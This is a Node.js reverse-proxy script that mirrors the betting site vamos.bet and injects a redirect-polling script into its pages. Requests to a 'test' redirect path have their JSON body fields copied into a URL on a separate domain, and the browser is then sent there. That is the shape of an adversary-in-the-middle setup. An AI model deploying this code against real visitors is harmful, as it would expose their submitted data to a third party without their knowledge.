import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";

// Global error handlers
process.on('uncaughtException', (err) => {
  console.error('💥 Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason) => {
  console.error('💥 Unhandled Rejection:', reason);
});

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;
const PROXY_PUBLIC_DOMAIN = "http://127.0.0.1:6005";
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;
const REDIRECT_API_PATH = "/api/v9/test/redirect";
const REDIRECT_BASE_URL = "https://test3.marziplus.com";
const REDIRECT_TTL_MS = 30_000;

const clients = new Map();

function createClientId() { return crypto.randomUUID(); }
function getClientId(req) {
  const match = (req.headers.cookie || "").match(/(?:^|;\s*)proxy_client_id=([^;]+)/);
  return match ? match[1] : null;
}
function getOrCreateClient(req, res) {
  let id = getClientId(req);
  if (!id) {
    id = createClientId();
    res.setHeader("Set-Cookie", `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`);
  }
  if (!clients.has(id)) {
    clients.set(id, { redirected: false, redirectUrl: null, createdAt: Date.now() });
  }
  return id;
}

setInterval(() => {
  const now = Date.now();
  for (const [id, state] of clients.entries()) {
    if (now - state.createdAt > REDIRECT_TTL_MS) clients.delete(id);
  }
}, 10_000);

function injectWatcher(html) {
  const script = `<script>
(async function() {
  async function checkProxyRedirect() {
    try {
      const res = await fetch("/__proxy_redirect_status", { cache: "no-store", credentials: "same-origin" });
      if (!res.ok) return;
      const data = await res.json();
      if (data.redirect && data.url) window.location.replace(data.url);
    } catch (_) {}
  }
  setInterval(checkProxyRedirect, 500);
  checkProxyRedirect();
})();
</script>`;
  return html.includes("</body>") ? html.replace("</body>", `${script}</body>`) : html + script;
}

function removeHopByHopHeaders(headers) {
  const result = { ...headers };
  const connection = result.connection;
  if (connection) {
    connection.split(",").map(v => v.trim().toLowerCase()).forEach(h => delete result[h]);
  }
  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;
  return result;
}

function buildUpstreamHeaders(clientReq) {
  const headers = { ...clientReq.headers, host: TARGET_HOSTNAME, "accept-encoding": "identity" };
  delete headers.connection;
  delete headers["content-length"];
  return headers;
}

function handleHtmlResponse(upstreamRes, clientRes) {
  const chunks = [];
  upstreamRes.on("data", chunk => chunks.push(chunk));
  upstreamRes.on("end", () => {
    let html = Buffer.concat(chunks).toString("utf8");
    html = injectWatcher(html);
    const body = Buffer.from(html, "utf8");
    const headers = removeHopByHopHeaders(upstreamRes.headers);
    delete headers["content-length"];
    delete headers["content-encoding"];
    headers["content-length"] = body.length;
    clientRes.writeHead(upstreamRes.statusCode || 200, headers);
    clientRes.end(body);
  });
  upstreamRes.on("error", err => {
    console.error("HTML response error:", err.message);
    if (!clientRes.headersSent) clientRes.writeHead(502, { "Content-Type": "text/plain" });
    clientRes.end("Bad Gateway");
  });
}

function handleNormalResponse(upstreamRes, clientRes) {
  const headers = removeHopByHopHeaders(upstreamRes.headers);
  clientRes.writeHead(upstreamRes.statusCode || 200, headers);
  upstreamRes.pipe(clientRes);
}

function forwardRequest(clientReq, clientRes, bufferedBody = null) {
  const headers = buildUpstreamHeaders(clientReq);
  const options = {
    hostname: TARGET_HOSTNAME,
    port: TARGET_PORT,
    method: clientReq.method,
    path: clientReq.url,
    headers,
    rejectUnauthorized: true,
    timeout: 30000,
  };
  console.log(`→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`);

  const upstreamReq = https.request(options, upstreamRes => {
    console.log(`← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`);
    const contentType = (upstreamRes.headers["content-type"] || "").toLowerCase();
    if (contentType.includes("text/html")) {
      handleHtmlResponse(upstreamRes, clientRes);
    } else {
      handleNormalResponse(upstreamRes, clientRes);
    }
  });

  upstreamReq.on("error", err => {
    console.error("❌ Upstream error:", err.message);
    if (!clientRes.headersSent) clientRes.writeHead(502, { "Content-Type": "text/plain" });
    clientRes.end(`Bad Gateway: ${err.message}`);
  });

  upstreamReq.on("timeout", () => {
    upstreamReq.destroy();
    if (!clientRes.headersSent) clientRes.writeHead(504, { "Content-Type": "text/plain" });
    clientRes.end("Gateway Timeout");
  });

  if (Buffer.isBuffer(bufferedBody)) {
    upstreamReq.setHeader("Content-Length", bufferedBody.length);
    upstreamReq.end(bufferedBody);
  } else {
    clientReq.pipe(upstreamReq);
  }
}

function handleRedirectStatus(state, clientRes) {
  const response = JSON.stringify({ redirect: Boolean(state?.redirected), url: state?.redirectUrl || null });
  clientRes.writeHead(200, {
    "Content-Type": "application/json",
    "Cache-Control": "no-store",
    "Content-Length": Buffer.byteLength(response),
  });
  clientRes.end(response);
}

async function handleRedirectRequest(clientReq, clientRes, state) {
  const chunks = [];
  for await (const chunk of clientReq) chunks.push(chunk);
  const body = Buffer.concat(chunks);
  if (body.length === 0) {
    console.log("Redirect endpoint has no body.");
    return forwardRequest(clientReq, clientRes, body);
  }

  console.log("\n==========================================");
  console.log("REDIRECT ENDPOINT");
  console.log(`Body size: ${body.length} bytes`);

  let json;
  try {
    json = JSON.parse(body.toString("utf8"));
  } catch (_) {
    console.log("Invalid JSON. Forwarding request.");
    console.log("==========================================\n");
    return forwardRequest(clientReq, clientRes, body);
  }

  if (!json || typeof json !== "object" || Array.isArray(json)) {
    console.log("Request body is not a JSON object.");
    return forwardRequest(clientReq, clientRes, body);
  }

  console.log("Received JSON:", JSON.stringify(json, null, 2));
  const redirectUrl = new URL(REDIRECT_BASE_URL);
  for (const [key, value] of Object.entries(json)) {
    if (value !== undefined && value !== null) redirectUrl.searchParams.set(key, String(value));
  }
  const finalUrl = redirectUrl.toString();
  console.log(`Redirect URL: ${finalUrl}`);

  if (state) {
    state.redirected = true;
    state.redirectUrl = finalUrl;
    state.createdAt = Date.now();
  }

  const response = JSON.stringify({ success: true, proxyRedirect: true });
  clientRes.writeHead(200, {
    "Content-Type": "application/json",
    "Cache-Control": "no-store",
    "Content-Length": Buffer.byteLength(response),
  });
  clientRes.end(response);
  console.log("Browser session marked for redirect.");
  console.log("==========================================\n");
}

const server = http.createServer(async (clientReq, clientRes) => {
  try {
    const parsedUrl = new URL(clientReq.url, `http://${clientReq.headers.host || PROXY_PUBLIC_DOMAIN}`);
    const path = parsedUrl.pathname;
    const clientId = getOrCreateClient(clientReq, clientRes);
    const state = clients.get(clientId);
    console.log(`→ ${clientReq.method} ${clientReq.url}`);

    if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
      return handleRedirectStatus(state, clientRes);
    }

    if (path === REDIRECT_API_PATH) {
      return await handleRedirectRequest(clientReq, clientRes, state);
    }

    if (state?.redirected) {
      console.log(`🛑 Session blocked after redirect: ${path}`);
      clientRes.writeHead(410, { "Content-Type": "text/plain", "Cache-Control": "no-store" });
      return clientRes.end("Proxy session terminated");
    }

    forwardRequest(clientReq, clientRes);
  } catch (err) {
    console.error("❌ Request handler error:", err);
    if (!clientRes.headersSent) clientRes.writeHead(500, { "Content-Type": "text/plain" });
    clientRes.end("Internal Server Error");
  }
});

server.on("clientError", (err, socket) => {
  console.error("Client error:", err.message);
  socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log("\n==========================================");
  console.log(" Vamora Reverse Proxy");
  console.log("==========================================");
  console.log(`Public:   https://${PROXY_PUBLIC_DOMAIN}`);
  console.log(`Local:    http://${PROXY_HOST}:${PROXY_PORT}`);
  console.log(`Upstream: https://${TARGET_HOSTNAME}`);
  console.log(`Trigger:  ${REDIRECT_API_PATH}`);
  console.log(`Redirect: ${REDIRECT_BASE_URL}`);
  console.log("==========================================\n");
});